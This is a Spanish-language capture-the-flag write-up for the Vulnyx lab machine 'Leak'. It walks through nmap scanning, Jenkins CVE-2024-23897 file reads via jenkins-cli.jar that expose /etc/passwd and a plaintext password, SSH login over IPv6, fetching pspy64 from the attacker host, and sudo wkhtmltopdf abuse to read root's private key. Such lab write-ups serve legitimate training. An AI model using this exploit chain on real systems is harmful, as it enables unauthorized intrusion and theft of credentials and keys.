---
layout: post
title: Leak - Vulnyx
---

# Writeup
![Leak]({{'/assets/img/Leak/leak.png' | relative_url}})

Vulnyx

----------------------------------------------------------------------------------------------

Iniciamos el escaneo con **Nmap** en busca de puertos expuestos y reconocer los sevicios que los ocupan, para posteriormente buscar vulnerabilidades.

```bash
❯ nmap -p- --open -sS -T5 -vvv -n -Pn 192.168.2.8
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 22:17 CEST
Initiating ARP Ping Scan at 22:17
Scanning 192.168.2.8 [1 port]
Completed ARP Ping Scan at 22:17, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:17
Scanning 192.168.2.8 [65535 ports]
Discovered open port 8080/tcp on 192.168.2.8
Discovered open port 80/tcp on 192.168.2.8
Completed SYN Stealth Scan at 22:17, 0.47s elapsed (65535 total ports)
Nmap scan report for 192.168.2.8
Host is up, received arp-response (0.000060s latency).
Scanned at 2024-04-06 22:17:28 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:6F:A8:18 (Oracle VirtualBox virtual NIC)
```
```bash
❯ nmap -sCV -p80,8080 192.168.2.8
Nmap 7.94SVN scan initiated Sat Apr  6 20:41:53 2024 as: nmap -sCV -p80,8080 -oN targeted 192.168.2.8
Nmap scan report for leak (192.168.2.8)
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8080/tcp open  http    Jetty 10.0.13
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.13)
|_http-title: Panel de control [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:6F:A8:18 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  6 20:42:03 2024 -- 1 IP address (1 host up) scanned in 10.21 seconds
```
Encontramos los puertos **80 y 8080** veremos a ver que conteiene...

En el puerto *80* encontramos la pagina por defecto del servidor **apache**
![apache]({{'/assets/img/Leak/apache-inicio.png' | relative_url}})

Lanzo **dirbuster** para hacer fuzzing de directorios
```bash
❯ dirbuster -u http://192.168.2.8 -l /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
File found: /connect.php - 200
Dir found: /icons/small/ - 403
DirBuster Stopped
```
Solo obtengo un archivo con extension *php* pero nada mas.

Por otro lado en el puert 8080 nos encontramos con **jenkins** un servidor de automatizacion 

![jenkins]({{'/assets/img/Leak/jenkins.png' | relative_url}})

En la esquina inferior derecha aparece la version **Jenkins 2.401.2**, asi que voy a buscar posibles vulnerabilidades que existentes para esta version.

Busco en el github del vulhub que contiene algunos exploits sobre jenkins.

En el siguiente * Enlace [Jenkins Arbitrary File Read Vulnerability Through the CLI (CVE-2024-23897](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897)

Debemos descargarnos el archivo **jenkins-cli.jar y le damos permisos de ejecucion.
```bash
❯ wget http://192.168.2.8:8080/jnlpJars/jenkins-cli.jar
--2024-04-07 00:31:44--  http://192.168.2.8:8080/jnlpJars/jenkins-cli.jar
Conectando con 192.168.2.8:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3447904 (3,3M) [application/java-archive]
Grabando a: «jenkins-cli.jar»

jenkins-cli.jar                                       100%[======================================================================================================================>]   3,29M  --.-KB/s    en 0,03s   

2024-04-07 00:31:44 (124 MB/s) - «jenkins-cli.jar» guardado [3447904/3447904]

❯ chmod +x jenkins-cli.jar 
```
Siguiendo lo pasos voy a intentar leer el archivo **/etc/passwd** y comprovar que todo funciona.

```bash
❯ java -jar jenkins-cli.jar -s http://192.168.2.8:8080/ -http connect-node "@/etc/passwd"
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin" exists.
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin: No such agent "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin" exists.
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin: No such agent "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin" exists.
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin: No such agent "systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin" exists.
avahi:x:107:114:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin: No such agent "avahi:x:107:114:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
george:x:1000:1000:george:/home/george:/bin/bash: No such agent "george:x:1000:1000:george:/home/george:/bin/bash" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin: No such agent "messagebus:x:103:109::/nonexistent:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin: No such agent "sshd:x:105:65534::/run/sshd:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin: No such agent "systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin" exists.
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin: No such agent "systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin" exists.
jenkins:x:106:112:Jenkins,,,:/var/lib/jenkins:/bin/bash: No such agent "jenkins:x:106:112:Jenkins,,,:/var/lib/jenkins:/bin/bash" exists.
geoclue:x:108:115::/var/lib/geoclue:/usr/sbin/nologin: No such agent "geoclue:x:108:115::/var/lib/geoclue:/usr/sbin/nologin" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
```

Veo que funciona y de momento tengo capacidad de lectura de archivos, antes vi que habia un archivo **connect.php** voy a ver que contiene.

```bash
❯ java -jar jenkins-cli.jar -s http://192.168.2.8:8080/ -http connect-node "@/var/www/html/connect.php"
: anonymous no tiene el permiso Nodo/Connect
$password = "g30rg3_L3@k3D";: No such agent "$password = "g30rg3_L3@k3D";" exists.
$servername = "localhost";: No such agent "$servername = "localhost";" exists.
<?php: No such agent "<?php" exists.
$username = "george";: No such agent "$username = "george";" exists.
?>: No such agent "?>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```

Se pueden observar unas credenciales, que probare en la pagina de login de jenkins con el ususario *George*
![invalid-password]({{'/assets/img/Leak/invalid-password.png' | relative_url}})

Al parecer no hay suerte, hay que seguir buscando y, hay un archivo con contenido interesante.
Que se trata del archivo **if_inet6** con una ipv6 configurada en la interfaz *enp0s3*
```bash
❯ java -jar jenkins-cli.jar -s http://192.168.2.8:8080/ -http connect-node "@/proc/net/if_inet6"
00000000000000000000000000000001 01 80 10 80       lo: No such agent "00000000000000000000000000000001 01 80 10 80       lo" exists.
fe800000000000000a0027fffe6fa818 02 40 20 80   enp0s3: No such agent "fe800000000000000a0027fffe6fa818 02 40 20 80   enp0s3" exists.
```

Le paso un escaner de puertos con *Nmap*
```bash
❯ nmap -p- --open -sS -T5 -vvv -n -Pn -6 fe80:0000:0000:0000:0a00:27ff:fe6f:a818
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 00:50 CEST
Initiating ND Ping Scan at 00:50
Scanning fe80::a00:27ff:fe6f:a818 [1 port]
Completed ND Ping Scan at 00:50, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:50
Scanning fe80::a00:27ff:fe6f:a818 [65535 ports]
Discovered open port 8080/tcp on fe80::a00:27ff:fe6f:a818
Discovered open port 22/tcp on fe80::a00:27ff:fe6f:a818
Discovered open port 80/tcp on fe80::a00:27ff:fe6f:a818
Completed SYN Stealth Scan at 00:50, 0.75s elapsed (65535 total ports)
Nmap scan report for fe80::a00:27ff:fe6f:a818
Host is up, received nd-response (0.000043s latency).
Scanned at 2024-04-07 00:50:00 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:6F:A8:18 (Oracle VirtualBox virtual NIC)
```

Bien, bien, al parecer tiene el puerto 22 *ssh* expuesto y provare con las mismas credenciales de antes.

```bash
❯ ssh george@fe80:0000:0000:0000:0a00:27ff:fe6f:a818%enp3s0
george@fe80::a00:27ff:fe6f:a818%enp3s0's password: 
george@leak:~$ export TERM=xterm
george@leak:~$ pwd
/home/george
george@leak:~$ hostname
leak
george@leak:~$ hostname -I
192.168.2.8 
george@leak:~$ 
```
Estamos dentro, como el usuario *george*
```bash
george@leak:~$ cat user.txt 
f65**************************2c6
 ```
 Y el siguiente comando nos revela que podemos usar el archivo **wkhtmltopdf** con privilegios de *sudo*
```bash
george@leak:~$ sudo -l
Matching Defaults entries for george on leak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User george may run the following commands on leak:
    (root) NOPASSWD: /usr/bin/wkhtmltopdf
```
Esta aplicación permite extraer datos de una página HTML y convertirlos en archivos PDF o imágenes.

En este punto poca cosa mas encuentro, ejecutare **pspy64** que sirver para poder ver ejecuciones a las que no tenemos acceso con nuestro usuario.

```bash
george@leak:/tmp$ wget http://192.168.2.128/pspy64
--2024-04-07 01:11:30--  http://192.168.2.128/pspy64
Conectando con 192.168.2.128:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3104768 (3,0M) [application/octet-stream]
Grabando a: «pspy64»

pspy64                                                100%[======================================================================================================================>]   2,96M  --.-KB/s    en 0,01s   

2024-04-07 01:11:30 (292 MB/s) - «pspy64» guardado [3104768/3104768]
```
Le doy permisos y lo ejecuto

```bash
024/04/07 01:12:37 CMD: UID=0     PID=2      | 
2024/04/07 01:12:37 CMD: UID=0     PID=1      | /sbin/init 
2024/04/07 01:13:01 CMD: UID=0     PID=34884  | /usr/sbin/CRON -f 
2024/04/07 01:13:01 CMD: UID=0     PID=34885  | /usr/sbin/CRON -f 
2024/04/07 01:13:01 CMD: UID=0     PID=34886  | /bin/sh -c /usr/bin/file /root/private.txt 
```
Esto es interesante, hay un archivo *private.txt* en el directorio root, al que puedo convertir a pdf y ver que contiene.

```bash
george@leak:/tmp$ sudo /usr/bin/wkhtmltopdf /root/private.txt private.pdf
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
Loading page (1/2)
Printing pages (2/2)                                               
Done                                                           
george@leak:/tmp$ ls -la private.pdf 
-rw-r--r-- 1 root root 15944 abr  7 01:15 private.pdf
george@leak:/tmp$
```
Hay esta, me lo paso a mi maquina para ver que contiene.

```bash
wget http://192.168.2.8:1234/private.pdf
--2024-04-07 01:17:33--  http://192.168.2.8:1234/private.pdf
Conectando con 192.168.2.8:1234... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 15944 (16K) [application/pdf]
Grabando a: «private.pdf»

private.pdf                                           100%[======================================================================================================================>]  15,57K  --.-KB/s    en 0s      

2024-04-07 01:17:33 (321 MB/s) - «private.pdf» guardado [15944/15944]
```
Sorpresa sorpresa!! es una **id_rsa** imagino que de root y es lo que voy a probar
![id-rsa]({{'/assets/img/Leak/idrsa.png' | relative_url}})

Copio el contenido y lo almaceno en un archivo en mi maquina para hacer una conexion por ssh utilizando la clave. Le otorgamos los privilegios necesarios.

Y estamos dentro.
```bash
❯ chmod 600 id_rsa
❯ ssh root@fe80:0000:0000:0000:0a00:27ff:fe6f:a818%enp3s0 -i id_rsa
root@leak:~# export TERM=xterm
root@leak:~# whoami
root
root@leak:~# cat .r00000000000000t.txt 
89c**************************9f1
```
Espro que te pueda servir de ayuda. GRACIAS por venir.
